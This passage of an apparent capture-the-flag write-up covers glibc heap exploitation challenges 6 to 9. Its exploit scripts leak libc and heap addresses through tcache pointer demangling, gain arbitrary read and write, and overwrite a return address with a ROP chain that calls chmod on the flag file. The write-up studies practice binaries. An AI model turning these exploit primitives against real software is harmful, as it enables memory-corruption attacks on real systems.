    secret_addr = environ_stack_addr + 0x110
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

## Challenge 6

This time the leak resides within the main heap. \
Simply retrieve this value out of the leaked `main_arena`, which is stored within libc. 

```python
def exploit():
    ...
    # Leak main heap
    main_heap_leak_addr = main_arena_libc_addr + 0x60
    heap_base = arbitrary_read(r1, r2, heap_key, addr=main_heap_leak_addr, index=2)
    assert(len(heap_base) == 6)
    heap_base = u64(heap_base + 2 * b'\x00') & 0xfffffffffffff000
    print(f'heap_base: {hex(heap_base)}')

    # Read the secret
    secret_addr = heap_base + 0x3e0
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')
```

## Challenge 7

Now there's no more flag resides within memory. Moreover, binary has full mitigations - PIE, NX Canary and full RELRO. Hence, we have the need for a generic write primitive, and overwrite the stack's RA and forge a ROP chain. \
Notice there are multiple stacks we can overwrite - the main thread, or any other thread. For simplicity of the exploit I've chose to stick with our lovely first thread as the only-exploited thread. \
I've chose to leak the thread's stack using the main heap, as it is more reliable than using the program's stack. In particular, I've chose to overwrite the return address of the internal frame opened by `fscanf`. \
That way this would work even if the program was compiled with `__noreturn` on its implemented methods. Moreover, a cool trick is that because some internal functions within libc are compiled without canaries, eventhough the binary did, there are no canaries - and we can perform linear stack overflow for a tcache chunk allocated there (at the generic case, in case `ra` isn't aligned to `0x10`). 

```python
p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')
    
    # Leak libc address using the thread's heap
    log.info("Reading libc address")
    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Leak main heap
    main_heap_leak_addr = main_arena_libc_addr + 0x60
    heap_base = arbitrary_read(r1, r2, heap_key, addr=main_heap_leak_addr, index=2)
    assert(len(heap_base) == 6)
    heap_base = u64(heap_base + 2 * b'\x00') & 0xfffffffffffff000
    print(f'heap_base: {hex(heap_base)}')

    # Read thread stack using a pointer resides within the main thread's heap
    t1_stack_leak_offset = 0x2e0
    t1_stack_leak_addr = heap_base + t1_stack_leak_offset
    print(f't1_stack_leak_addr: {hex(t1_stack_leak_addr)}')
    t1_stack_leak = arbitrary_read(r1, r2, heap_key, addr=t1_stack_leak_addr, index=4)
    assert(len(t1_stack_leak) == 6)
    t1_stack_leak = u64(t1_stack_leak + 2 * b'\x00')
    t1_ra_offset = 0xc98
    t1_ra_addr = t1_stack_leak - t1_ra_offset
    print(f't1_stack_leak: {hex(t1_stack_leak)} t1_ra_addr: {hex(t1_ra_addr)}')

    # Overwrite ra
    flag_string_addr = t1_ra_addr + 0x28
    rop_bytes = b'A' * 0x28
    rop_bytes += p64(pop_rdi_ret)
    rop_bytes += p64(flag_string_addr)
    rop_bytes += p64(pop_rsi_ret)
    rop_bytes += p64(0xffff)
    rop_bytes += p64(chmod_addr)
    rop_bytes += p64(0x67616c662f)  # flag
    arbitrary_write(r1, r2, heap_key, addr=t1_ra_addr - 0x28, values=rop_bytes, index=6)
```

## Challenge 8

Because I've used the libc-no-canary trick, I could arbitrarly overwrite return addresses of internal libc calls, even if they weren't aligned to 0x10. \
That way, the no-return compilation flag had no impact for my exploit, and the solution is identical to 7.

## Challenge 9

This challenge is pretty cool. \
For every `malloc` request, a random allocation is being performed, of random size. There seems to be a loop of only 1 allocation, hence I'd assume challenge 10 requires dealing with multiple / random amount of allocations. 

It is interesting to see how the size randomization is actually achieved. `rand_size` is actually a variable located within the .bss. In particular, the seed that is being used is its own address:

```c
rand_size = rand_r(&rand_size) % 0x4000;
```

This means that in case the binary wouldv'e been compiled with PIE, there wouldn't be randomization at all (as the .bss addresseses wouldn't be re-shuffled). Alternatively, if we would be able to leak the PIE program base, we would be able to determine the exact randomization results (via `cpython` is great for such tasks). \
Another thing to consider, is the fact that all allocations are saved within `surprise` array, located within the .bss too. Moreover, for every `free` request, both the slot and the randomized chunks are being freed. 





[memory-leaks]: https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/
